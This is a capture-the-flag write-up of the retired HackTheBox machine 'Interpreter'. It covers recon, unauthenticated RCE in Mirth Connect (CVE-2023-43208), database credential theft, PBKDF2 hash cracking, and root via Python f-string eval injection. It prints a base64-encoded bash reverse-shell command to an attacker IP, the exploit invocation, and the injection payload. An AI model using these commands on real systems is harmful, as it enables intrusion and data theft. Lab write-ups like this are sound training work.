# Interpreter — HackTheBox Writeup
**Difficulty:** Medium | **OS:** Linux | **Points:** 30 | **Author:** thrandomv

---

## Machine Info

| Field | Detail |
|---|---|
| Name | Interpreter |
| OS | Linux (Debian 12) |
| Difficulty | Medium |
| Target IP | 10.129.254.240 |

---

## Attack Chain Overview

| Stage | Technique | Detail |
|---|---|---|
| 1 | Recon | Nmap reveals Mirth Connect 4.4.0 on Jetty (ports 22/80/443) |
| 2 | RCE | CVE-2023-43208 — unauthenticated XStream deserialization via /api/users |
| 3 | Lateral Movement | DB creds in mirth.properties → MariaDB → PBKDF2 crack → SSH as sedric |
| 4 | Privesc | Python f-string double eval in root-owned Flask server (notif.py) |

---

## Stage 1 — Reconnaissance

### Port Scan

```bash
nmap -sC -sV -oN interpreter_init.txt 10.129.254.240
```

**Results:**

```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.2p1 Debian 2+deb12u7
80/tcp  open  http     Jetty  (Mirth Connect Administrator)
443/tcp open  ssl/http Jetty  (Mirth Connect Administrator)
```

### Service Fingerprinting

Browsing to port 80/443 presents a **Mirth Connect Administrator** login portal. Mirth Connect is a healthcare integration engine used to route HL7 messages — high-value target when internet-exposed.

Confirm the version via API (requires the `X-Requested-With` header or Jetty returns a 400):

```bash
curl -sk https://interpreter.htb/api/server/version \
  -H "X-Requested-With: XMLHttpRequest"
# Response: 4.4.0
```

NextGen Connect **4.4.0** is publicly known to be vulnerable to **CVE-2023-43208**.

---

## Stage 2 — Initial Foothold (CVE-2023-43208)

### Vulnerability Analysis

CVE-2023-43208 is an unauthenticated pre-auth RCE in Mirth Connect ≤ 4.4.0. It bypasses the incomplete fix from CVE-2023-37679. Root cause: insecure XML deserialization via the XStream library.

**Technical breakdown:**
- Mirth Connect uses XStream to convert XML into Java objects
- The `/api/users` endpoint accepts `application/xml` payloads without authentication
- XStream can be manipulated to instantiate arbitrary classes via a crafted gadget chain
- The gadget chain triggers `ProcessBuilder.start()` or `Runtime.exec()`, executing OS commands as the `mirth` service account

### Exploitation

Clone the PoC:

```bash
git clone https://github.com/jakabakos/CVE-2023-43208-mirth-connect-rce-poc.git
cd CVE-2023-43208-mirth-connect-rce-poc
```

Set up listener:

```bash
nc -lvnp 4444
```

Base64-encode the reverse shell payload to avoid spaces in the XML gadget chain:

```bash
echo -n 'bash -i >& /dev/tcp/10.10.14.4/4444 0>&1' | base64
# YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzQ0NDQgMD4mMQ==
```

Fire the exploit using brace expansion to keep the command space-free:

```bash
python3 CVE-2023-43208.py -u https://interpreter.htb \
  -c "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzQ0NDQgMD4mMQ==}|{base64,-d}|bash"
```

Shell received as `mirth`. Stabilize:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z → stty raw -echo → fg
```

---

## Stage 3 — Lateral Movement (mirth → sedric)

### Credential Discovery

Mirth Connect stores database credentials in plaintext in its properties file:

```bash
cat /usr/local/mirthconnect/conf/mirth.properties | grep -i password
# database.password = MirthPass123!
```

Connect to the local MariaDB instance and extract user hashes:

```bash
mysql -u mirthdb -pMirthPass123! -h 127.0.0.1 mc_bdd_prod \
  -e "SELECT CONCAT(p.USERNAME,':',pp.PASSWORD)
      FROM PERSON p JOIN PERSON_PASSWORD pp ON p.ID=pp.PERSON_ID;"
```

**Output:**

```
sedric:u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==
```

### Hash Analysis & Cracking

Mirth Connect 4.4.0 uses **PBKDF2-HMAC-SHA256** with **600,000 iterations**. The Base64 value decodes to a 40-byte blob: 8 bytes salt + 32 bytes derived key.

Decode and inspect:

```bash
echo 'u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==' | base64 -d | xxd -p -c 256
# bbff8b0413949da762c8506c30ea080cf2db511d2b939f641243d4d7b8ad76b55603f90b32ddf0fb
# Salt (first 8 bytes):  bbff8b0413949da7  →  u/+LBBOUnac=
# Key  (next 32 bytes):  62c8506c...ddf0fb  →  YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=
```

Format for Hashcat mode 10900 and crack:

```bash
echo "sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=" > hash.txt
hashcat -m 10900 hash.txt /usr/share/wordlists/rockyou.txt
```

**Result:** `sedric:snowflake1`

> A weak dictionary password despite PBKDF2's strength. No hashing algorithm protects bad passwords.

### SSH Access

```bash
ssh sedric@interpreter.htb
# password: snowflake1
```

**User Flag:** `6fe54247b118ae1bfcd36759d4cd58dd`

---

## Stage 4 — Privilege Escalation (sedric → root)

### Process Enumeration

```bash
ps aux | grep python
# root  3518  ...  /usr/bin/python3 /usr/local/bin/notif.py
```

A root-owned Python service is running. Read it:

```bash
cat /usr/local/bin/notif.py
```

### Source Code Review

The relevant section of `notif.py`:

```python
def template(first, last, sender, ts, dob, gender):
    pattern = re.compile(r"^[a-zA-Z0-9._'\"(){}=+/]+$")
    for s in [first, last, sender, ts, dob, gender]:
        if not pattern.fullmatch(s):
            return "[INVALID_INPUT]"
    # ...
    template = f"Patient {first} {last} ({gender}), {{datetime.now().year - year_of_birth}} years old, received from {sender} at {ts}"
    try:
        return eval(f"f'''{template}'''")
```

### Vulnerability Analysis — Double F-String Eval

The function performs **double evaluation**:

1. Python constructs a string using a standard f-string, interpolating `first`, `last`, `gender`, `sender`, `ts` directly into the string
2. That resulting string is then wrapped in *another* f-string and passed to `eval()`
3. In Python, anything inside `{}` in an f-string is executed as code
4. If we inject `{malicious_code}` into any XML field, it survives step 1 as a literal string, then gets **executed by `eval()` as root** in step 2

**Regex filter analysis:**

```
Pattern: ^[a-zA-Z0-9._'"(){}=+/]+$

Blocked:  spaces, commas, semicolons, square brackets
Allowed:  parentheses (), curly braces {}, quotes, dots, slashes
```

The `{}` characters are explicitly allowed — meaning f-string injection is wide open.

### Exploitation

Inject into the `<firstname>` field to read root.txt directly via the double eval:

```bash
xml='<patient>
  <firstname>{open("/root/root.txt").read()}</firstname>
  <lastname>a</lastname>
  <sender_app>a</sender_app>
  <timestamp>a</timestamp>
  <birth_date>01/01/2000</birth_date>
  <gender>a</gender>
</patient>'

printf "POST /addPatient HTTP/1.1\r\nHost: localhost\r\nContent-Type: application/xml\r\nContent-Length: %d\r\n\r\n%s" \
  "$(echo -n "$xml" | wc -c)" "$xml" | nc 127.0.0.1 54321
```

The server processes the XML → regex passes `{}` as allowed → `eval()` executes the injected expression as root → flag returned in the HTTP response body.

**Root Flag:** `cf9ad2d666a8c9232ea6e08c3468bd91`

---

## Lessons Learned

### Vulnerabilities Exploited

| Vulnerability | Type | Impact |
|---|---|---|
| XStream Deserialization | CVE-2023-43208 | Unauthenticated RCE as mirth |
| Plaintext DB Credentials | CWE-312 | Lateral movement to MariaDB |
| Weak Password (PBKDF2) | CWE-521 | Credential compromise of sedric |
| Python F-String Injection | CWE-94 | Code execution as root via eval() |

### Key Takeaways

- **Exposed healthcare middleware is always a priority target** — Mirth Connect, Epic, Rhapsody. Version-check immediately and cross-reference CVEs.
- **Java middleware config files almost always contain hardcoded credentials** — `mirth.properties`, `application.properties`, `web.xml` are the first files to check after foothold.
- **PBKDF2 at 600k iterations is cryptographically sound — snowflake1 is in rockyou.txt.** Algorithm strength is irrelevant against weak passwords. The hashing layer did its job; the password policy didn't.
- **`eval()` on user-controlled data is an unconditional critical sink.** Regex filters on allowed characters don't help when the injection characters (`{}`) are explicitly permitted.
- **Double f-string evaluation is a subtle pattern** — the injected payload is invisible at construction time and only executes in the second pass. Easy to miss in code review.

### MITRE ATT&CK Mapping

| Technique | ID | Stage |
|---|---|---|
| Exploit Public-Facing Application | T1190 | Initial Access |
| Credentials In Files | T1552.001 | Credential Access |
| Password Cracking | T1110.002 | Credential Access |
| Python Execution | T1059.006 | Execution |
| Abuse Elevation Control Mechanism | T1548 | Privilege Escalation |

---

*Box retired before publishing — writeup released per HTB guidelines.*
